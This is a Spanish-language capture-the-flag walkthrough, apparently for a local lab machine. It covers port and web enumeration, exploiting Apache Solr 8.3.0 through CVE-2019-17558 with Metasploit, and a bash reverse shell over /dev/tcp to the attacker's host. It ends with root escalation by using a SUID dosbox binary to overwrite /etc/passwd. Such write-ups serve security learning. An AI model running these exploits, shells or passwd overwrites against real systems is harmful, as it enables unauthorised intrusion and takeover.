@@ -1,0 +1,102 @@
+# Enumeracion de Puertos, Servicios y Versiones
+
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap
+
+80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
+8983/tcp open  http    syn-ack ttl 64 Apache Solr
+
+al chequea el servicio web levantado por el puerto 80 no podemos conectarnos pero solo debemos agregar buffered.dl
+a /etc/hosts, despues de esto vemos una imagen, asi que aplicaremos fuzzing web
+
+# Fuzzing Web
+
+gobuster dir -u http://buffered.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,js,png,jpg -t 100
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 837]
+/.html                (Status: 403) [Size: 276]
+/.html                (Status: 403) [Size: 276]
+/server-status        (Status: 403) [Size: 276]
+Progress: 1661144 / 1661152 (100.00%)
+===============================================================
+
+gobuster dir -u http://172.17.0.2:8983 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,js,png,jpg -t 100
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/api                  (Status: 200) [Size: 161]
+/v2                   (Status: 200) [Size: 161]
+Progress: 1661144 / 1661152 (100.00%)
+===============================================================
+
+si revisamos en http://172.17.0.2:8983 podemos ver directamente la version solr-spec v8.3.0
+si buscamos en la web conseguimos [CVE:2019-17558] que es vulnerable a RCE y podemos explotar
+a traves de metasploit
+
+
+msfconsole -q
+search CVE:2019-17558
+use 0
+show options
+set RHOSTS 172.17.0.2
+set LHOST 172.17.0.1
+exploit
+shell
+
+Estamos dentro del sistema!
+
+# Escalada
+
+para mi comodidad, enviare una reverse shell para conectarme con netcat
+
+nc -lnvp 8000					| me quedo en escucha con netcat
+
+ahora envio la reverse shell desde msfconsole
+
+bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/8000 0>&1"
+
+ahora desde la instancia de netcat comenzamos
+
+script /dev/null -c bash 
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+whoami
+ninhack
+find / -perm -4000 2>/dev/null
+/usr/bin/dosbox
+
+tenemos el suid dosbox que si lo buscamos en gtfobins nos dira como abusar del binario:
+
+	| LFILE='\path\to\file_to_write'
+	| ./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
+
+si entiendo bien, aqui lo que veo es que puedo ejecutar comandos DOS, asi que sabiendo comando basicos
+puedo realizar la escalada, me voy al directorio del user ninhack
+
+cd~
+
+lo que hare sera crearme un archivo en el directorio actual con el contenido de /etc/passwd para modificarlo
+eliminando la "x" que se encuentra en la primera linea que corresponde a root (para que cualquier user escale sin password)
+
+cat /etc/passwd > passwd
+nano passwd
+
+ahora lo que hare sera ejecutar el suid dosbox para que muestre lo que contiene el archivo que cree (y modifique) y esa salida la 
+direccione a /etc/passwd y asi sobreescribir la informacion original y escarlar a root
+
+/usr/bin/dosbox -c 'mount c /' -c 'type c:\home\ninhack\passwd > c:\etc\passwd' -c exit
+
+'mount c /' = cambiamos c por / (c es el equivalente en windows de / en linux)
+type en windows es el equivalente de cat en linux
+
+asi que esto: 'type c:\home\ninhack\passwd > c:\etc\passwd' es en windows
+lo que 'cat /home/ninhack/passwd > /etc/passwd' seria en linux
+
+su 
+#root
